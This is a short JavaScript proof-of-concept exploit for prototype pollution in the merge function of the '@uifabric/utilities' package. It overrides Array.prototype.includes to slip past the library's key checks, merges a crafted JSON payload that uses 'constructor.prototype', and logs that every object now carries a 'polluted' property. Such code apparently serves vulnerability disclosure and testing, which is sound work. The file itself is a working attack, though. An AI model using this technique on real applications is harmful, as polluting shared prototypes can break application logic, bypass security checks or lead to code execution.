Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const util = require('@uifabric/utilities');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
const source2 = { k3: {} };
console.log({}.polluted);
y = util.merge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);